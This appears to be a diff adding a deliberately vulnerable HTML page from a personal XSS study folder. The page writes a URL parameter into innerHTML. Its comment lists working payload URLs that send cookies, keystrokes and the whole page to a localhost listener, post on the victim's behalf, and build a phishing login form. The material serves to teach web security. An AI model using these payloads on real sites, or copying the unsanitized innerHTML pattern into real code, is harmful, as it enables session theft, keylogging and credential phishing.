@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <div id="content"></div>
+  <!-- <img src="http://placehold.it" onerror="window.alert('hello');"> -->
+<script>
+function setCookie(name ,value, days){
+  const date= new Date();
+  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); 
+  console.log(date)
+  const expires= 'Expires='+ date.toUTCString();
+  console.log(expires);
+  document.cookie=name+"="+value+';'+expires+";path=/; domain=127.0.0.1";
+}
+setCookie("auth","ashdaskljdhkls",5);
+  </script>
+  <script>
+
+    function makePublicPost(title,content){
+      var Xhr= new XMLHttpRequest();
+      console.log(Xhr)
+      console.log(document.cookie)
+    
+      Xhr.open('POST','http://127.0.0.1:5500', true)
+      Xhr.withCredentials=true
+      Xhr.setRequestHeader('Content-Type','application/json')
+      console.log(Xhr)
+      Xhr.send(JSON.stringify({ title, content }));
+    }
+    // makePublicPost("test", "legitimate")
+  </script>
+  <script>
+    const searchParams= new URLSearchParams(window.location.search)
+    console.log(searchParams.get('q'))
+    document.getElementById('content').innerHTML = `${searchParams.get('q')}`
+  </script>
+
+<!--
+
+Hijacking User session : Make use of query and accessing cookie and making external API call with data 
+
+http://127.0.0.1:5500/SystemDesign/3.%20Security/XSS/index.html?q=%3Cimg%20src=%22not-exist%22%20onerror=%22fetch(`https://localhost:5001/${document.cookie}`)%22/%3E
+
+http://127.0.0.1:5500/SystemDesign/3. Security/XSS/index.html?q=<img src="not-exist" onerror="fetch(`https://localhost:5001/${document.cookie}`)"/>
+
+By using URL like this we will be able to access the cookie and send to attacher end point 
+
+Unauthorized Moidification: Lets say we are on a public platform and there is a method called makePublicPost expoosed attcker wil be accessing this method and adding post on behalf of your identity
+
+http://127.0.0.1:5500/SystemDesign/3. Security/XSS/index.html?q=<img src="not-exist" onerror="makePublicPost('TEST','HACKER')"/>
+
+Accessing User Key stocks 
+http://127.0.0.1:5500/SystemDesign/3. Security/XSS/index.html?q=<img src="not-exist" onerror="window.alert('herllo');
+var timeout;
+var buffer = '';
+document.querySelector('body').addEventListener('keypress', function (event) { // Corrected addEventlistener to addEventListener and fixed missing `event` parameter
+  console.log('Key press happened');
+
+  if (event.which !== 0) { // Corrected typo from event.while to event.which
+    buffer += String.fromCharCode(event.which);
+
+    clearTimeout(timeout); // Clear any existing timeout before setting a new one
+    timeout = setTimeout(function () {
+      var xhr = new XMLHttpRequest();
+      var uri = 'http://localhost:4000/keys?data=' + encodeURIComponent(buffer);
+      xhr.open('GET', uri, true); // Added the true parameter for asynchronous request
+      xhr.send();
+      buffer = ''; // Reset buffer after sending
+    }, 400);
+  }
+});
+"/>
+
+http://127.0.0.1:5500/SystemDesign/3. Security/XSS/index.html?q=<img src="not-exist" onerror=%22window.alert%28%27herllo%27%29%3B%0Avar%20timeout%3B%0Avar%20buffer%20%3D%20%27%27%3B%0Adocument.querySelector%28%27body%27%29.addEventListener%28%27keypress%27%2C%20function%20%28event%29%20%7B%20%2F%2F%20Corrected%20addEventlistener%20to%20addEventListener%20and%20fixed%20missing%20%60event%60%20parameter%0A%20%20console.log%28%27Key%20press%20happened%27%29%3B%0A%0A%20%20if%20%28event.which%20%21%3D%3D%200%29%20%7B%20%2F%2F%20Corrected%20typo%20from%20event.while%20to%20event.which%0A%20%20%20%20buffer%20%2B%3D%20String.fromCharCode%28event.which%29%3B%0A%0A%20%20%20%20clearTimeout%28timeout%29%3B%20%2F%2F%20Clear%20any%20existing%20timeout%20before%20setting%20a%20new%20one%0A%20%20%20%20timeout%20%3D%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A4000%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent%28buffer%29%3B%0A%20%20%20%20%20%20xhr.open%28%27GET%27%2C%20uri%2C%20true%29%3B%20%2F%2F%20Added%20the%20true%20parameter%20for%20asynchronous%20request%0A%20%20%20%20%20%20xhr.send%28%29%3B%0A%20%20%20%20%20%20buffer%20%3D%20%27%27%3B%20%2F%2F%20Reset%20buffer%20after%20sending%0A%20%20%20%20%7D%2C%20400%29%3B%0A%20%20%7D%0A%7D%29%3B%0A%22%2F%3E
+
+
+Stealing User information from dom
+Its basically  attcker getting the entire dom content by inecting malisious scripts 
+
+http://127.0.0.1:5500/SystemDesign/3. Security/XSS/index.html?q=<img src="not-exist" onerror="window.alert('herllo');
+
+var xhr= new XMLHttpRequest();
+  var uri = 'http://localhost:4000/keys?data=' + document.body.innerHTML;
+xhr.open('GET',uri);
+xhr.withCredentials=true;
+xhr.send();
+"/>
+
+http://127.0.0.1:5500/SystemDesign/3. Security/XSS/index.html?q=%3Cimg%20src%3D%22not-exist%22%20onerror%3D%22window.alert%28%27herllo%27%29%3B%0A%0Avar%20xhr%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A4000%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent%28document%29%3B%0Axhr.open%28uri%29%3B%0Axhr.withCredentials%3Dtrue%3B%0Axhr.send%28%29%3B%0A%22%2F%3E
+
+Phishing Attack Using script
+
+<div>
+<h1>Login Page</h1>
+<form action='http://example/com/fakepage.php'>
+  Username: <br/>
+  <input type='username' name='username'/>
+  <br/>
+  Password
+  <input type='password' name='password'/>
+  <button type='submit' ><submit<button/>
+</form>
+</div>
+
+
+-->
+</body>
+</html>
